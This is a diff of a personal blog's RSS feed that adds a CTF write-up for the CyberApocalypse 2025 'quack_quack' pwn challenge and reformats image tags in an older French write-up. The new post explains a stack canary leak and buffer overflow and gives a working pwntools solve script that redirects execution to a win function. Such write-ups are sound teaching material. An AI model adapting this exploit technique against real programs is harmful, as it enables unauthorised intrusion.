@@ -6,8 +6,138 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 27 Oct 2024 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Sun, 23 Mar 2025 00:00:00 +0000</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>🇬🇧 CyberApocalypse 2025 - pwn/quack_quack</title>
+            <link>/posts/2025/03/cyberapocalypse-2025-pwn/quack_quack/</link>
+            <pubDate>Sun, 23 Mar 2025 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/2025/03/cyberapocalypse-2025-pwn/quack_quack/</guid>
+            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
+&lt;p&gt;Writeup for the first &lt;code&gt;pwn&lt;/code&gt; challenge from CyberApocalypse 2025.&lt;/p&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;On the quest to reclaim the Dragon&amp;#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&amp;#39;s time to face the Duck!
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re given the binary and the libc it uses&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;0x400000&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RUNPATH&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./glibc/&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;SHSTK&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;IBT&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;quack_quack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;glibc&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-linux-x86-64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;225daf82164eadc6e19bee1cd1965754eefed6aa&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Running the program prompts us to &amp;ldquo;Quack the duck&amp;rdquo; and it seems to exit no matter what we enter as input, forcing us to examine the decompilation.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="note">Note</h2>
+<p>Writeup for the first <code>pwn</code> challenge from CyberApocalypse 2025.</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>On the quest to reclaim the Dragon&#39;s Heart, the wicked Lord Malakar has cursed the villagers, turning them into ducks! 
+</span></span><span style="display:flex;"><span>Join Sir Alaric in finding a way to defeat them without causing harm. Quack Quack, it&#39;s time to face the Duck!
+</span></span></code></pre></div><h2 id="file-information">File information</h2>
+<p>We&rsquo;re given the binary and the libc it uses</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">quack_quack</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">quack_quack</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/cyberapocalypse2025/pwn/quack_quack/quack_quack&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Canary</span> <span style="color:#f92672">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RUNPATH</span><span style="color:#f92672">:</span>    <span style="color:#f92672">b</span><span style="color:#e6db74">&#39;./glibc/&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">SHSTK</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">IBT</span><span style="color:#f92672">:</span>        <span style="color:#f92672">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">quack_quack</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">./</span><span style="color:#f92672">glibc</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">225daf82164eadc6e19bee1cd1965754eefed6aa</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+</span></span></code></pre></div><p>Running the program prompts us to &ldquo;Quack the duck&rdquo; and it seems to exit no matter what we enter as input, forcing us to examine the decompilation.</p>
+<h2 id="reversing-the-binary">Reversing the binary</h2>
+<p><img src="https://i.ibb.co/7xJnznY7/2025-03-22-235503-570x523-scrot.png" alt="2025-03-22-235503_570x523_scrot"></p>
+<p>This is the <code>duckling()</code> function (which is essentially the main function). Right away, we understand why the program was exiting: our first input has to contain &ldquo;Quack Quack &quot; (the space at the end is important) for the program to continue.</p>
+<p>We see that after the first input there is a second input, which will read 106 bytes into an unknown buffer. We&rsquo;ll determine its size later.</p>
+<p>Essentially, the program returns after the second input, which suggests that we need to disrupt its execution flow through one of the two inputs.</p>
+<h2 id="identifying-vulnerabilities">Identifying vulnerabilities</h2>
+<p>Since the program has no PIE but has stack canaries, we understand that the first step is going to be leaking the canaries to achieve a successful buffer overflow.</p>
+<p>The first vulnerability lies in this piece of code:</p>
+<p><img src="https://i.ibb.co/RT366jxp/2025-03-23-000508-577x112-scrot.png" alt="2025-03-23-000508_577x112_scrot"></p>
+<p>Here, <code>strstr()</code> will return a pointer to the first occurrence of &ldquo;Quack Quack &quot; inside the buffer. Then, <code>printf()</code> will display all text characters (due to the <code>%s</code>) from that offset and 32 bytes after.</p>
+<p>This can be leveraged to leak data from the stack, because if we fill the input buffer with dummy data, then put &ldquo;Quack Quack &quot; at the end, it will read beyond the buffer and leak stack data.</p>
+<p>To confirm this, we can test it while debugging the program:</p>
+<p><img src="https://i.ibb.co/7tBy5ssb/2025-03-23-001602-1403x176-scrot.png" alt="2025-03-23-001602_1403x176_scrot"></p>
+<p>Here we can see that the end of our input ends up 32 bytes before RBP, which is perfect because the program should leak us 32 bytes, and that will contain the canary (its value is the one above RBP, here it is <code>0xd779...</code>)</p>
+<p>Let&rsquo;s check that it works:</p>
+<p><img src="https://i.ibb.co/JRyNYF25/2025-03-23-002205-494x73-scrot.png" alt="2025-03-23-002205_494x73_scrot"></p>
+<p>Indeed, we did get some leaks from the stack. Though we can&rsquo;t verify that it&rsquo;s the canary because the characters are not printable, it should be correct.</p>
+<p>Now for the second vulnerability, we can assume it&rsquo;s a buffer overflow in the second input. Let&rsquo;s investigate and try to determine after how many characters the program crashes.</p>
+<p>The following line indicates the buffer is 0x60 bytes long, but since there are stack canaries, it will only be 0x58 bytes.</p>
+<p><img src="https://i.ibb.co/k2LFMfPc/2025-03-23-003147-531x26-scrot.png" alt="2025-03-23-003147_531x26_scrot"></p>
+<p>This confirms that we have a buffer overflow because the <code>read()</code> will be reading 106 bytes of input into an 88-byte buffer.</p>
+<p>Let&rsquo;s confirm this by simply sending a large input:</p>
+<p><img src="https://i.ibb.co/xq70FLBt/2025-03-23-005552-1896x260-scrot.png" alt="2025-03-23-005552_1896x260_scrot"></p>
+<p>Indeed, we overflowed the buffer, but that triggered the stack smashing detection.</p>
+<p>Finally, we need to know where to jump in the program. Since this is a CTF challenge, it has a &ldquo;win&rdquo; function called <code>duck_attack()</code>:</p>
+<p><img src="https://i.ibb.co/KcqrVTSs/2025-03-23-005956-518x449-scrot.png" alt="2025-03-23-005956_518x449_scrot"></p>
+<p>So we&rsquo;ll jump to the address of this function, which is static because PIE isn&rsquo;t enabled.</p>
+<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
+<ol>
+<li>Fill the first input buffer so it leaks values from the stack</li>
+<li>Parse the output to extract the value of the stack canary</li>
+<li>Craft a payload that will overwrite RIP with <code>duck_attack()</code>&rsquo;s address, without triggering the stack smashing detector</li>
+</ol>
+<h2 id="solve-script">Solve Script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;94.237.57.171&#34;</span>, <span style="color:#ae81ff">51170</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./quack_quack&#34;</span>)
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>first_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQuack Quack &#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, first_payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>adresses <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Quack Quack &#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;,&#34;</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>canary_bytes <span style="color:#f92672">=</span> adresses[:<span style="color:#ae81ff">7</span>]
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> canary_bytes<span style="color:#f92672">.</span>rjust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(canary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;canary value = &#34;</span> <span style="color:#f92672">+</span> hex(canary))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>second_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">88</span> <span style="color:#f92672">+</span> p64(canary) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;duck_attack&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>, second_payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>This was a fun challenge even though it was a standard stack canary bypass. It&rsquo;s always good to review acquired knowledge.</p>
+]]></content>
+        </item>
         
         <item>
             <title>🇬🇧 HeroCTF 2024 - pwn/bankrupst</title>
@@ -513,16 +643,16 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </span></span><span style="display:flex;"><span>    PIE:      No PIE (<span style="color:#ae81ff">0x400000</span>)
 </span></span></code></pre></div><p>Il s&rsquo;agit d&rsquo;un <em>ELF</em> en <em>64 bits</em> protégé par <code>NX</code>.</p>
 <p>On va le run pour avoir une idée de ce qu&rsquo;il fait:</p>
-<p><img alt="2023-05-08-112543_973x101_scrot" src="https://user-images.githubusercontent.com/77807503/236800594-665593f0-e38e-4ab0-bb6b-fd1d948e559b.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800594-665593f0-e38e-4ab0-bb6b-fd1d948e559b.png" alt="2023-05-08-112543_973x101_scrot"></p>
 <p>Il nous demande notre username, puis on accède à un menu avec <strong>4 options</strong></p>
-<p><img alt="2023-05-08-112550_1094x371_scrot" src="https://user-images.githubusercontent.com/77807503/236800637-b28d55d1-7239-43b6-8776-4d97c4bfef1e.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800637-b28d55d1-7239-43b6-8776-4d97c4bfef1e.png" alt="2023-05-08-112550_1094x371_scrot"></p>
 <p>On va lancer <code>Ghidra</code> pour comprendre un peut mieux comment le programme fonctionne.</p>
 <h4 id="main">Main</h4>
-<p><img alt="2023-05-08-113209_749x501_scrot" src="https://user-images.githubusercontent.com/77807503/236800688-3e10c0a5-e92d-45c2-9bb0-c0414fc562b6.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800688-3e10c0a5-e92d-45c2-9bb0-c0414fc562b6.png" alt="2023-05-08-113209_749x501_scrot"></p>
 <p>Après avoir renommé le variable de <em>buffer</em>, on voit qu&rsquo;il n&rsquo;y a a priori pas de vulnérabilité dans la fonction <code>main()</code>, le <em>buffer</em> dans lequel est stocké l&rsquo;username est de la même taille que le <code>fgets()</code> donc ça me paraît bon.</p>
 <p>On voit qu&rsquo;elle appelle une fonction <code>menu()</code>, on va s&rsquo;y intéresser</p>
 <h4 id="menu">Menu</h4>
-<p><img alt="2023-05-08-113854_514x764_scrot" src="https://user-images.githubusercontent.com/77807503/236800701-5cb4532d-49b2-4d8e-bb84-d296055a4512.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800701-5cb4532d-49b2-4d8e-bb84-d296055a4512.png" alt="2023-05-08-113854_514x764_scrot"></p>
 <p>Après avoir renommé les variables <em>buffer</em> et <em>money</em> (qui stockent l&rsquo;argent de l&rsquo;utilisateur), on regarde les différentes options:</p>
 <ol>
 <li>Affiche l&rsquo;argent de l&rsquo;utilisateur</li>
@@ -532,14 +662,14 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 </ol>
 <p>On va regarder un peu les fonctions unes par unes et voir si on peut trouver des vuln</p>
 <h4 id="buy_ticket">buy_ticket</h4>
-<p><img alt="2023-05-08-114712_687x573_scrot" src="https://user-images.githubusercontent.com/77807503/236800786-67e9c5cc-7cd2-414f-8c90-91ef85b7cc0b.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800786-67e9c5cc-7cd2-414f-8c90-91ef85b7cc0b.png" alt="2023-05-08-114712_687x573_scrot"></p>
 <p>Après s&rsquo;être faits rickroll de plein fouet, on peut s&rsquo;attarder sur la manière dont le choix de quantité. En effet, <strong>la fonction ne vérifie pas si notre input est négatif</strong>, en entrant un nombre négatif dans l&rsquo;input de quantité, notre <em>money</em> va augmenter au lieu de diminuer (comme elle le devrait si on achetait une quantité positive).</p>
 <p>Ok, on sait comment abuser d&rsquo;un <em>logic bug</em> pour avoir de l&rsquo;argent infini, maintenant il faut savoir à quoi il va nous servir</p>
 <h4 id="buy_vip_ticket">buy_vip_ticket</h4>
-<p><img alt="2023-05-08-115648_570x636_scrot" src="https://user-images.githubusercontent.com/77807503/236800808-03d6ca0b-1619-4917-a82b-766fdee8589c.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800808-03d6ca0b-1619-4917-a82b-766fdee8589c.png" alt="2023-05-08-115648_570x636_scrot"></p>
 <p>Si l&rsquo;utilisateur a sufisamment d&rsquo;argent, un <em>input</em> lui permet de confirmer l&rsquo;action et il devient <strong>VIP</strong></p>
 <h4 id="access_lounge">access_lounge</h4>
-<p><img alt="2023-05-08-120254_520x411_scrot" src="https://user-images.githubusercontent.com/77807503/236800827-964fb1c7-5102-45a7-9b31-77b0aa5d4214.png"></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/236800827-964fb1c7-5102-45a7-9b31-77b0aa5d4214.png" alt="2023-05-08-120254_520x411_scrot"></p>
 <p>Cette dernière fonction n&rsquo;est accessible que si nous sommes <strong>VIP</strong>, mais puisque nous avons un bug pour le devenir, ce n&rsquo;est pas un problème.</p>
 <p>Et nous avons enfin notre vuln ! Le <code>fgets</code> lit <code>0x100</code> bytes et les stocke quand un <em>buffer</em> de <code>16</code> bytes, on a donc ici une <em>buffer overflow</em>.</p>
 <h2 id="tldr-vulnérabilités">TLDR: Vulnérabilités</h2>
@@ -552,8 +682,7 @@ We can determine which <code>play_?()</code> function was used by playing the mu
 <p>La première étape de notre exploit va donc être d&rsquo;avoir accès au salon <strong>VIP</strong> pour avoir la <code>BOF</code>, puis grâce à cette dernière on va <em>leak</em> une adresse de la <code>libc</code> et retourner au <code>main</code>, puis réaccéder au <strong>VIP</strong> et appeller <code>system</code> via la <em>BOF</em>.</p>
 <p><code>Logic bug -&gt; ret2main (with leaks) -&gt; ret2system</code></p>
 <blockquote>
-<p>Je ne montrerai pas dans ce post comment récupérer les différentes adresses statiques, je vous invite à aller voir mes posts de pwn précédents si ça vous initéresse</p>
-</blockquote>
+<p>Je ne montrerai pas dans ce post comment récupérer les différentes adresses statiques, je vous invite à aller voir mes posts de pwn précédents si ça vous initéresse</p></blockquote>
 <h2 id="exploit">Exploit</h2>
 <p>Voici mon exploit final:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
